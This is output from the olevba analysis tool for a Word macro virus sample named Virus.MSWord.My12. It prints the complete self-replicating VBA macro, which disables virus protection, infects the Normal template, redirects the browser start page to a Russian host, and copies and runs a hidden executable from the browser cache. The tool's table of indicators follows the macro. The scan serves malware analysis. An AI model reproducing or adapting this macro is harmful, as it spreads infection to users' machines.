olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.My12
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.My12 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<-signature string
Private Sub Document_Open()
On Error Resume Next
Application.Options.VirusProtection = False
Set x = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set y = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
If x.Lines(1, 1) <> "'<-signature string" Then
x.DeleteLines 1, x.CountOfLines
End If
If x.CountOfLines = 0 Then
x.InsertLines 1, y.Lines(1, y.CountOfLines)
End If
NormalTemplate.Save
If y.Lines(1, 1) <> "'<-signature string" Then
y.DeleteLines 1, y.CountOfLines
End If
If y.CountOfLines = 0 Then
y.InsertLines 1, x.Lines(1, x.CountOfLines)
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page") = "http://my12.narod.ru/www.htm"
Dim RetVal
RetVal = Shell("command.com /c dir/a/b>c:\12.txt c:\windows\tempor~1\content.IE5\", 0)
For I = 1 To 10000000
Next I
Dim SourFile, DestinatFile
SourFile = "c:\12.txt"
DestinatFile = "c:\123.txt"
FileCopy SourFile, DestinatFile
Dim MyString
Open "c:\12.txt" For Input As #1
Open "c:\123.txt" For Output As #2
Do While Not EOF(1)
    Line Input #1, MyString
    Debug.Print MyString
Print #2, "C:\Windows\Temporary Internet Files\Content.IE5\"; MyString; "\web31[1].avi"

Loop
Close #1
Close #2
Dim TextLine
Open "c:\123.txt" For Input As #1
Do While Not EOF(1)
    Line Input #1, TextLine
    Debug.Print TextLine

Dim SourceFile, DestinationFile
SourceFile = TextLine
On Error Resume Next
DestinationFile = "c:\viv.exe"
FileCopy SourceFile, DestinationFile

Loop
Close #1
Kill "c:\12.txt"
Kill "c:\123.txt"

Dim MyAppID
MyAppID = Shell("c:\viv.exe", 0)
AppActivate MyAppID
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://my12.narod.ru|URL                                          |
|          |/www.htm            |                                             |
|IOC       |viv.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

